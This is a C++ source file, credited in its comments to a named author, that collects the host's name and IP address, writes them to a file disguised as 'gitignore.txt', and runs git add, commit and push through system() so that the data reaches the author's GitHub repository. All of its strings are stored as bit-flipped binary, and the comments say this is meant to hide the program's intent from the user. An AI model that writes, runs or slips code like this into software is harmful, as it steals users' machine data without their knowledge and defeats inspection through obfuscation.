// code that steals the ip address and writes to file and uploads to our github with their data
// part of the IP portion was sourced from geeksforgeeks, linked below. additional functionaility written by calvin turrell
// - added binary to string conversion to hide data
// - all strings stored as binary
// - all stored binary strings are flipped and unflipped when used
// https://www.geeksforgeeks.org/c-program-display-hostname-ip-address/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <iostream>
#include <fstream>

using namespace std;

string undo(string data){//converts data from hidden binary to string
    stringstream sstream(data);
    string output;
    while(sstream.good())
    {
        bitset<8> bits;
        sstream >> bits;
        char c = char(bits.to_ulong());
        output += c;
    }

    return output;
}

string mix(string data){ // flips bits
    string output;
    for(int i = 0; i < data.size(); i++){
        if(data.at(i) == '0'){
            output += '1';
        }else if(data.at(i) == '1'){
            output += '0';
        }else{
            output += ' ';
        }
    }

    return output;
}

void test1(int hostname)
{
    if (hostname == -1)
    {
        string aa = undo(mix("10011000 10011010 10001011 10010111 10010000 10001100 10001011 10010001 10011110 10010010 10011010 11110101"));
        perror(aa.c_str()); // gethostname
        exit(1);
    }
}
 

void test2(struct hostent * hostentry)
{
    if (hostentry == NULL)
    {
        string aa = undo(mix("10011000 10011010 10001011 10010111 10010000 10001100 10001011 10011101 10000110 10010001 10011110 10010010 10011010"));
        perror(aa.c_str()); //gethostbyname
        exit(1);
    }
}
 

void test3(char *IPbuffer)
{
    if (NULL == IPbuffer)
    {
        string aa = undo(mix("10010110 10010001 10011010 10001011 10100000 10010001 10001011 10010000 10011110"));
        perror(aa.c_str()); //inet_ntoa
        exit(1);
    }
}

void doSomething()
{
    char hostbuffer[256];
    char *IPbuffer;
    struct hostent *host_entry;
    int hostname;

    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    test1(hostname);
 
    host_entry = gethostbyname(hostbuffer);
    test2(host_entry);
 
    IPbuffer = inet_ntoa(*((struct in_addr*)
                        host_entry->h_addr_list[0]));
 
    // gitignore.txt
    ofstream stolendata0(undo(mix("10011000 10010110 10001011 10010110 10011000 10010001 10010000 10001101 10011010 11010001 10001011 10000111 10001011 11110101"))); // kind of sneaky naming, maybe the user will skip over the .txt part and not notice hidden intent
    stolendata0 << hostbuffer << "\n"; // write the hostname to data
    stolendata0 << IPbuffer << "\n"; // write host IP to data
    stolendata0.close();

    // git add gitignore.txt
    system(undo(mix("10011000 10010110 10001011 11011111 10011110 10011011 10011011 11011111 10011000 10010110 10001011 10010110 10011000 10010001 10010000 10001101 10011010 11010001 10001011 10000111 10001011 11110101")).c_str()); // upload to github
    // git commit -m test
    system(undo(mix("10011000 10010110 10001011 11011111 10011100 10010000 10010010 10010010 10010110 10001011 11011111 11010010 10010010 11011111 10001011 10011010 10001100 10001011 11110101")).c_str());
    // git push
    system(undo(mix("10011000 10010110 10001011 11011111 10001111 10001010 10001100 10010111 11110101")).c_str());

}